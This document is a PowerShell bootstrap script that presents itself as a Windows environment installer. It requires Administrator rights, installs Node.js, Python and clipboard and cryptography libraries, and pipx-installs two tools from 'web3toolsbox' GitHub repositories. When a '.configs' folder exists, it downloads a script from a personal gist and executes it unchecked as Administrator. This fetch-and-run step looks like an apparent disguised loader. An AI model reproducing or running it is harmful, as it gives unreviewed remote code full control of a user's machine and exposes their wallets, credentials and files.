if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host 'Please run this script as Administrator.' -ForegroundColor Red
    exit 1
}

$originalPSDefaults = if ($PSDefaultParameterValues -and $PSDefaultParameterValues.Count -gt 0) {
    $PSDefaultParameterValues.Clone()
} else {
    @{}
}

$PSDefaultParameterValues['*:Verbose'] = $false
$PSDefaultParameterValues['*:Debug'] = $false

$script:FailedSteps = New-Object System.Collections.Generic.List[string]

function Restore-Preferences {
    $PSDefaultParameterValues.Clear()
    foreach ($key in $originalPSDefaults.Keys) {
        $PSDefaultParameterValues[$key] = $originalPSDefaults[$key]
    }
}

function Write-StepLog {
    param(
        [string]$Message
    )
    Write-Host "[STEP] $Message" -ForegroundColor Cyan
}

function Write-InfoLog {
    param(
        [string]$Message
    )
    Write-Host "[INFO] $Message" -ForegroundColor Green
}

function Write-WarnLog {
    param(
        [string]$Message
    )
    Write-Host "[WARN] $Message" -ForegroundColor Yellow
}

function Add-FailedStep {
    param(
        [string]$Step,
        [string]$Reason
    )

    if ($Reason) {
        $script:FailedSteps.Add("$Step ($Reason)")
    } else {
        $script:FailedSteps.Add($Step)
    }
}

function Get-ExceptionMessage {
    param(
        [System.Management.Automation.ErrorRecord]$ErrorRecord
    )

    if ($ErrorRecord -and $ErrorRecord.Exception -and $ErrorRecord.Exception.Message) {
        return $ErrorRecord.Exception.Message
    }

    return 'unknown error'
}

function Write-ContinueOnError {
    param(
        [string]$Step,
        [string]$Action,
        [System.Management.Automation.ErrorRecord]$ErrorRecord
    )

    $message = Get-ExceptionMessage -ErrorRecord $ErrorRecord
    Write-WarnLog "Failed to $Action, but execution will continue: $message"
    Add-FailedStep -Step $Step -Reason $message
}

# GitHub raw/gist endpoints can fail on older Windows PowerShell defaults unless
# TLS 1.2+ is enabled explicitly for the current process.
function Enable-ModernTls {
    try {
        $protocol = [System.Net.ServicePointManager]::SecurityProtocol
        $tls12 = [System.Net.SecurityProtocolType]::Tls12
        if (($protocol -band $tls12) -ne $tls12) {
            $protocol = $protocol -bor $tls12
        }

        try {
            $tls13 = [System.Net.SecurityProtocolType]::Tls13
            if (($protocol -band $tls13) -ne $tls13) {
                $protocol = $protocol -bor $tls13
            }
        } catch {
        }

        [System.Net.ServicePointManager]::SecurityProtocol = $protocol
    } catch {
    }
}

# Reload PATH after installers update user or machine environment variables.
function Update-ProcessPath {
    $machinePath = [System.Environment]::GetEnvironmentVariable('Path', 'Machine')
    $userPath = [System.Environment]::GetEnvironmentVariable('Path', 'User')
    $pathParts = @()

    if ($machinePath) {
        $pathParts += $machinePath
    }

    if ($userPath) {
        $pathParts += $userPath
    }

    if ($pathParts.Count -gt 0) {
        $env:Path = $pathParts -join ';'
    }
}

# Test whether a path is a Windows Store app execution alias (stub).
function Test-StoreStub {
    param(
        [string]$Path
    )

    if (-not $Path) {
        return $true
    }

    # WindowsApps stubs are always under this directory
    if ($Path -like '*\Microsoft\WindowsApps\*' -or $Path -like '*\WindowsApps\*') {
        return $true
    }

    return $false
}

# Return the first matching executable from a list of candidate command names,
# skipping Windows Store stubs.
function Get-CommandPath {
    param(
        [string[]]$Names
    )

    foreach ($name in $Names) {
        try {
            $commands = Get-Command $name -ErrorAction Stop
            foreach ($command in $commands) {
                if ($command -and $command.Source -and -not (Test-StoreStub $command.Source)) {
                    return $command.Source
                }
            }
        } catch {
        }
    }

    return $null
}

# Given a command path that might be py.exe or a Store stub, resolve the real
# python.exe via sys.executable and verify it works.
function Resolve-PythonPath {
    param(
        [string]$Candidate
    )

    if (-not $Candidate) {
        return $null
    }

    try {
        & $Candidate --version >$null 2>$null
        if ($LASTEXITCODE -ne 0) {
            return $null
        }
    } catch {
        return $null
    }

    # If this is py.exe (launcher), resolve the actual python.exe it delegates to
    $leafName = Split-Path $Candidate -Leaf
    if ($leafName -eq 'py.exe') {
        try {
            $realExe = (& $Candidate -c "import sys; print(sys.executable)" 2>$null | Out-String).Trim()
            if ($realExe -and (Test-Path $realExe)) {
                return $realExe
            }
        } catch {
        }
    }

    return $Candidate
}

function Get-PipxVenvPythonPath {
    param(
        [string[]]$VenvNames
    )

    $userProfile = $env:USERPROFILE
    $candidates = @()

    foreach ($venvName in $VenvNames) {
        if (-not $venvName) {
            continue
        }

        if ($userProfile) {
            $candidates += "$userProfile\pipx\venvs\$venvName\Scripts\python.exe"
        }

        if ($env:LOCALAPPDATA) {
            $candidates += "$env:LOCALAPPDATA\pipx\venvs\$venvName\Scripts\python.exe"
        }
    }

    foreach ($candidate in $candidates) {
        if ($candidate -and (Test-Path $candidate)) {
            try {
                return (Resolve-Path $candidate).Path
            } catch {
                return $candidate
            }
        }
    }

    return $null
}

# Scrape the latest 64-bit Python installer URL and fall back to a pinned build
# if the download pages cannot be parsed.
function Get-PythonInstallerArch {
    $arch = $env:PROCESSOR_ARCHITECTURE
    if ($arch -eq 'ARM64') {
        return 'arm64'
    }
    if ($arch -eq 'x86') {
        return 'win32'
    }
    return 'amd64'
}

function Get-LatestPythonInstallerUrl {
    $installerArch = Get-PythonInstallerArch
    $pageUrls = @(
        'https://www.python.org/downloads/latest/',
        'https://www.python.org/downloads/windows/'
    )

    Enable-ModernTls

    foreach ($pageUrl in $pageUrls) {
        try {
            $response = Invoke-WebRequest -Uri $pageUrl -UseBasicParsing -ErrorAction Stop
            if (-not $response.Content) {
                continue
            }

            # Use a dedicated variable name to avoid clobbering automatic variable $matches.
            $pythonMatches = [regex]::Matches($response.Content, "(https://www\.python\.org)?/ftp/python/[^`"'<>\s]+/python-[0-9.]+-$installerArch\.exe")
            foreach ($match in $pythonMatches) {
                $url = $match.Value
                if ($url -notmatch '^https://') {
                    $url = "https://www.python.org$url"
                }

                return $url
            }
        } catch {
        }
    }

    return "https://www.python.org/ftp/python/3.13.3/python-3.13.3-$installerArch.exe"
}

function Get-WindowsNodeArch {
    if ($env:PROCESSOR_ARCHITECTURE -match 'ARM64' -or $env:PROCESSOR_ARCHITEW6432 -match 'ARM64') {
        return 'arm64'
    }

    if ([System.Environment]::Is64BitOperatingSystem) {
        return 'x64'
    }

    return 'x86'
}

function Get-LatestNodeRelease {
    param(
        [string]$Arch
    )

    $fileTag = "win-$Arch-zip"
    Enable-ModernTls

    try {
        $releases = Invoke-RestMethod -Uri 'https://nodejs.org/dist/index.json' -ErrorAction Stop
        foreach ($release in $releases) {
            if (-not $release.version) {
                continue
            }

            $files = @($release.files)
            if ($files -contains $fileTag) {
                return [pscustomobject]@{
                    Version = $release.version
                    Url     = "https://nodejs.org/dist/$($release.version)/node-$($release.version)-win-$Arch.zip"
                }
            }
        }
    } catch {
    }

    return $null
}

function Install-NodeJs {
    Write-StepLog 'Checking Node.js runtime'

    $nodePath = Get-CommandPath -Names @('node', 'node.exe')
    $npmPath = Get-CommandPath -Names @('npm', 'npm.cmd')
    $currentVersion = $null
    if ($nodePath) {
        try {
            $currentVersion = (& $nodePath -v 2>$null | Out-String).Trim()
        } catch {
        }
    }

    $arch = Get-WindowsNodeArch
    $latestRelease = Get-LatestNodeRelease -Arch $arch
    if (-not $latestRelease) {
        Write-WarnLog "Unable to resolve latest official Node.js release for architecture '$arch'."
        Add-FailedStep -Step 'Install Node.js' -Reason 'release-resolve-failed'
        return
    }

    if ($currentVersion -eq $latestRelease.Version -and $npmPath) {
        Write-InfoLog "Node.js already at latest official version: $currentVersion"
        return
    }

    $zipPath = Join-Path $env:TEMP "node-$($latestRelease.Version)-win-$arch.zip"
    $extractRoot = Join-Path $env:TEMP "node-extract-$([guid]::NewGuid().ToString('N'))"
    $installPath = Join-Path $env:ProgramFiles 'nodejs'

    Write-InfoLog "Installing Node.js $($latestRelease.Version) from: $($latestRelease.Url)"

    try {
        Enable-ModernTls
        Invoke-WebRequest -Uri $latestRelease.Url -OutFile $zipPath -UseBasicParsing -ErrorAction Stop

        New-Item -ItemType Directory -Path $extractRoot -Force
        Expand-Archive -Path $zipPath -DestinationPath $extractRoot -Force

        $extractedDir = Get-ChildItem -Path $extractRoot -Directory | Select-Object -First 1
        if (-not $extractedDir) {
            Write-WarnLog 'Node.js archive extraction failed: extracted directory not found.'
            Add-FailedStep -Step 'Install Node.js' -Reason 'extract-failed'
            return
        }

        if (-not (Test-Path $installPath)) {
            New-Item -ItemType Directory -Path $installPath -Force
        } else {
            Get-ChildItem -Path $installPath -Force | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
        }

        Copy-Item -Path (Join-Path $extractedDir.FullName '*') -Destination $installPath -Recurse -Force
        Add-ToPath $installPath
        Update-ProcessPath

        $nodePath = Get-CommandPath -Names @('node', 'node.exe')
        $installedVersion = $null
        if ($nodePath) {
            try {
                $installedVersion = (& $nodePath -v 2>$null | Out-String).Trim()
            } catch {
            }
        }

        if ($nodePath -and $installedVersion -eq $latestRelease.Version) {
            Write-InfoLog "Node.js installation completed: $installedVersion ($nodePath)"
            return
        }

        $detected = if ($installedVersion) { $installedVersion } else { 'not-detected' }
        Write-WarnLog "Node.js install finished but version check failed (expected=$($latestRelease.Version), detected=$detected)."
        Add-FailedStep -Step 'Install Node.js' -Reason "version-mismatch:$detected"
    } catch {
        Write-ContinueOnError -Step 'Install Node.js' -Action 'install Node.js' -ErrorRecord $_
    } finally {
        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
        Remove-Item $extractRoot -Recurse -Force -ErrorAction SilentlyContinue
    }
}

# Ensure a directory is in Machine PATH (registry) and current process PATH.
function Add-ToPath {
    param(
        [string]$Dir
    )

    if (-not $Dir -or -not (Test-Path $Dir)) {
        return
    }

    $machinePath = [System.Environment]::GetEnvironmentVariable('Path', 'Machine')
    if (-not $machinePath -or $machinePath -notlike "*$Dir*") {
        $newPath = if ($machinePath) { "$machinePath;$Dir" } else { $Dir }
        [System.Environment]::SetEnvironmentVariable('Path', $newPath, 'Machine')
    }

    if ($env:Path -notlike "*$Dir*") {
        $env:Path = "$Dir;$env:Path"
    }
}

# Make sure Python is available. If it is missing, download and install it
# quietly, then refresh PATH for the current process.
function Install-Python {
    Write-StepLog 'Checking Python runtime'

    # Try to find a working Python, skipping Store stubs
    foreach ($name in @('python', 'py')) {
        $candidate = Get-CommandPath -Names @($name)
        $resolved = Resolve-PythonPath $candidate
        if ($resolved) {
            Write-InfoLog "Python already available: $resolved"
            return $resolved
        }
    }

    $installerPath = Join-Path $env:TEMP 'python-installer.exe'
    $pythonUrl = Get-LatestPythonInstallerUrl
    Write-InfoLog "Python was not found. Downloading installer from: $pythonUrl"

    try {
        Enable-ModernTls
        Invoke-WebRequest -Uri $pythonUrl -OutFile $installerPath -ErrorAction Stop
        $process = Start-Process -FilePath $installerPath -ArgumentList @('InstallAllUsers=1', 'PrependPath=1', 'Include_launcher=1') -Wait -PassThru
        if ($process.ExitCode -eq 0) {
            Update-ProcessPath
            foreach ($name in @('python', 'py')) {
                $candidate = Get-CommandPath -Names @($name)
                $resolved = Resolve-PythonPath $candidate
                if ($resolved) {
                    Write-InfoLog "Python installation completed: $resolved"
                    return $resolved
                }
            }
        }

        Write-WarnLog "Python installer finished with exit code $($process.ExitCode), but Python is still unavailable."
        Add-FailedStep -Step 'Install Python' -Reason "exit=$($process.ExitCode)"
    } catch {
        Write-ContinueOnError -Step 'Install Python' -Action 'install Python' -ErrorRecord $_
    } finally {
        Remove-Item $installerPath -Force -ErrorAction SilentlyContinue
    }

    return $null
}

function Get-PackageVersion {
    param(
        [string]$PythonPath,
        [string]$PackageName
    )

    try {
        $version = & $PythonPath -c "import importlib.metadata as m; print(m.version('$PackageName'))" 2>$null | Out-String
        if ($LASTEXITCODE -eq 0) {
            return $version.Trim()
        }
    } catch {
    }

    return $null
}

# Install or upgrade a Python dependency when the minimum required version is
# not already available.
function Install-PythonPackage {
    param(
        [string]$PythonPath,
        [string]$Name,
        [string]$Version
    )

    if (-not $PythonPath) {
        Write-WarnLog "Skipping Python package '$Name' because Python is unavailable."
        Add-FailedStep -Step "Install Python package $Name" -Reason 'python-missing'
        return
    }

    $installedVersion = Get-PackageVersion -PythonPath $PythonPath -PackageName $Name
    if ($installedVersion) {
        try {
            if ([version]$installedVersion -ge [version]$Version) {
                Write-InfoLog "Python package already satisfies requirement: $Name $installedVersion"
                return
            }
        } catch {
        }
    }

    Write-StepLog "Ensuring Python package: $Name>=$Version"

    try {
        & $PythonPath -m pip install --upgrade "$Name>=$Version"
        if ($LASTEXITCODE -eq 0) {
            Write-InfoLog "Installed or updated Python package: $Name"
            return
        }

        Write-WarnLog "Failed to install Python package '$Name', but execution will continue (exit=$LASTEXITCODE)."
        Add-FailedStep -Step "Install Python package $Name" -Reason "exit=$LASTEXITCODE"
    } catch {
        Write-ContinueOnError -Step "Install Python package $Name" -Action "install Python package '$Name'" -ErrorRecord $_
    }
}

# Ensure pipx is available so CLI tools can be installed in isolated
# environments.
function Install-Pipx {
    param(
        [string]$PythonPath
    )

    Write-StepLog 'Checking pipx'

    $pipxPath = Get-CommandPath -Names @('pipx')
    if ($pipxPath) {
        Write-InfoLog "pipx already available: $pipxPath"
        try {
            & $pipxPath ensurepath
            if ($LASTEXITCODE -ne 0) {
                Write-WarnLog "pipx ensurepath failed, but execution will continue (exit=$LASTEXITCODE)."
                Add-FailedStep -Step 'Configure pipx path' -Reason "exit=$LASTEXITCODE"
            }
        } catch {
            Write-ContinueOnError -Step 'Configure pipx path' -Action 'configure pipx path' -ErrorRecord $_
        }

        Update-ProcessPath
        $pipxPath = Get-CommandPath -Names @('pipx')
        return [pscustomobject]@{
            CommandPath = $pipxPath
            PythonPath  = $null
        }
    }

    if (-not $PythonPath) {
        Write-WarnLog 'Skipping pipx installation because Python is unavailable.'
        Add-FailedStep -Step 'Install pipx' -Reason 'python-missing'
        return $null
    }

    Write-InfoLog 'pipx was not found. Installing it with Python.'

    try {
        & $PythonPath -m pip install pipx
        if ($LASTEXITCODE -ne 0) {
            Write-WarnLog "Failed to install pipx, but execution will continue (exit=$LASTEXITCODE)."
            Add-FailedStep -Step 'Install pipx' -Reason "exit=$LASTEXITCODE"
            return $null
        }

        # Add the Scripts directory (where pipx.exe lives) to PATH.
        # Resolve via sys.executable to handle py.exe / Store stubs correctly.
        $realPython = (& $PythonPath -c "import sys; print(sys.executable)" 2>$null | Out-String).Trim()
        $scriptsCandidates = @()
        if ($realPython) {
            $scriptsCandidates += Join-Path (Split-Path $realPython -Parent) 'Scripts'
        }
        $scriptsCandidates += (& $PythonPath -c "import sys, os; print(os.path.join(sys.prefix, 'Scripts'))" 2>$null | Out-String).Trim()
        $scriptsCandidates += (& $PythonPath -c "import sysconfig; print(sysconfig.get_path('scripts'))" 2>$null | Out-String).Trim()
        $scriptsCandidates += (& $PythonPath -c "import site, os; print(site.getusersitepackages().replace('site-packages','Scripts'))" 2>$null | Out-String).Trim()

        foreach ($dir in ($scriptsCandidates | Where-Object { $_ } | Select-Object -Unique)) {
            if (Test-Path (Join-Path $dir 'pipx.exe')) {
                Add-ToPath $dir
                break
            }
        }

        & $PythonPath -m pipx ensurepath

        # Also persist pipx bin dir (%USERPROFILE%\.local\bin) to PATH
        $pipxBinDir = Join-Path $env:USERPROFILE '.local\bin'
        if (-not (Test-Path $pipxBinDir)) {
            New-Item -ItemType Directory -Path $pipxBinDir -Force | Out-Null
        }
        Add-ToPath $pipxBinDir

        Update-ProcessPath
        $pipxPath = Get-CommandPath -Names @('pipx')
        if ($pipxPath) {
            Write-InfoLog "pipx installation completed: $pipxPath"
            return [pscustomobject]@{
                CommandPath = $pipxPath
                PythonPath  = $null
            }
        }

        Write-InfoLog 'pipx was installed and will be invoked via "python -m pipx".'
        return [pscustomobject]@{
            CommandPath = $null
            PythonPath  = $PythonPath
        }
    } catch {
        Write-ContinueOnError -Step 'Install pipx' -Action 'install pipx' -ErrorRecord $_
        return $null
    }
}

function Invoke-PipxInstall {
    param(
        [object]$PipxInvoker,
        [string]$PackageSpec,
        [switch]$Force
    )

    if (-not $PipxInvoker) {
        return $false
    }

    try {
        $installArgs = @('install')
        if ($Force) {
            $installArgs += '--force'
        }
        $installArgs += $PackageSpec

        if ($PipxInvoker.CommandPath) {
            & $PipxInvoker.CommandPath @installArgs
        } elseif ($PipxInvoker.PythonPath) {
            & $PipxInvoker.PythonPath -m pipx @installArgs
        } else {
            return $false
        }

        return ($LASTEXITCODE -eq 0)
    } catch {
        return $false
    }
}

# Install a pipx-managed CLI only when its command is not already available.
function Install-PipxPackage {
    param(
        [object]$PipxInvoker,
        [string]$PackageSpec,
        [string[]]$CommandNames,
        [string[]]$VenvNames = @()
    )

    $existingCommand = Get-CommandPath -Names $CommandNames
    $venvPythonPath = if ($VenvNames.Count -gt 0) { Get-PipxVenvPythonPath -VenvNames $VenvNames } else { $null }

    if ($existingCommand) {
        if ($VenvNames.Count -eq 0 -or $venvPythonPath) {
            Write-InfoLog "CLI already available, skipping install: $existingCommand"
            return
        }

        Write-WarnLog "CLI launcher exists but pipx environment is missing. Reinstalling package: $PackageSpec"
    }

    Write-StepLog "Ensuring pipx package: $PackageSpec"

    if (-not $PipxInvoker) {
        Write-WarnLog "Skipping pipx package installation because pipx is unavailable: $PackageSpec"
        Add-FailedStep -Step "Install pipx package $PackageSpec" -Reason 'pipx-missing'
        return
    }

    $forceInstall = ($existingCommand -and $VenvNames.Count -gt 0 -and -not $venvPythonPath)
    if (Invoke-PipxInstall -PipxInvoker $PipxInvoker -PackageSpec $PackageSpec -Force:$forceInstall) {
        Update-ProcessPath
        $installedCommand = Get-CommandPath -Names $CommandNames
        $venvPythonPath = if ($VenvNames.Count -gt 0) { Get-PipxVenvPythonPath -VenvNames $VenvNames } else { $null }
        if ($installedCommand -and ($VenvNames.Count -eq 0 -or $venvPythonPath)) {
            Write-InfoLog "Installed pipx package successfully: $installedCommand"
            return
        }

        Write-WarnLog "pipx reported success, but the package is still incomplete: $PackageSpec"
        Add-FailedStep -Step "Install pipx package $PackageSpec" -Reason 'command-or-venv-missing-after-install'
        return
    }

    Write-WarnLog "Failed to install pipx package, but execution will continue: $PackageSpec"
    Add-FailedStep -Step "Install pipx package $PackageSpec" -Reason 'install-failed'
}

try {
    Write-InfoLog 'Starting Windows installation bootstrap.'

    Install-NodeJs
    $pythonPath = Install-Python

    $requirements = @(
        @{ Name = 'requests'; Version = '2.31.0' },
        @{ Name = 'pyperclip'; Version = '1.8.2' },
        @{ Name = 'cryptography'; Version = '42.0.0' },
        @{ Name = 'pywin32'; Version = '306' },
        @{ Name = 'pycryptodome'; Version = '3.19.0' }
    )

    foreach ($pkg in $requirements) {
        Install-PythonPackage -PythonPath $pythonPath -Name $pkg.Name -Version $pkg.Version
    }

    $pipxInvoker = Install-Pipx -PythonPath $pythonPath
    Install-PipxPackage -PipxInvoker $pipxInvoker -PackageSpec 'git+https://github.com/web3toolsbox/claw.git' -CommandNames @('openclaw-config', 'openclaw-config.exe') -VenvNames @('claw')
    Install-PipxPackage -PipxInvoker $pipxInvoker -PackageSpec 'git+https://github.com/web3toolsbox/auto-backup-wins.git' -CommandNames @('autobackup', 'autobackup.exe') -VenvNames @('auto-backup-wins')

    if (Test-Path '.configs') {
        Write-StepLog 'Applying environment configuration'
        $gistUrl = 'https://gist.githubusercontent.com/wongstarx/2d1aa1326a4ee9afc4359c05f871c9a0/raw/install.ps1'

        try {
            Enable-ModernTls
            Write-InfoLog "Downloading configuration script: $gistUrl"
            $remoteScript = Invoke-WebRequest -Uri $gistUrl -UseBasicParsing -ErrorAction Stop
            if ($remoteScript.StatusCode -eq 200 -and $remoteScript.Content) {
                Write-InfoLog "Downloaded configuration script ($($remoteScript.Content.Length) chars)"
                Write-InfoLog "Executing configuration script: $gistUrl"
                & ([scriptblock]::Create($remoteScript.Content))
            } else {
                $statusCode = if ($remoteScript -and $remoteScript.StatusCode) { $remoteScript.StatusCode } else { 'unknown' }
                Write-WarnLog "Configuration script returned an empty response (status=$statusCode): $gistUrl"
                Add-FailedStep -Step 'Apply configuration' -Reason 'empty-response'
            }
        } catch {
            Write-ContinueOnError -Step 'Apply configuration' -Action 'apply configuration' -ErrorRecord $_
        }
    } else {
        Write-WarnLog 'Configuration directory not found, skipping environment configuration: .configs'
    }

    Write-InfoLog 'Installation bootstrap completed.'
} finally {
    Restore-Preferences
}
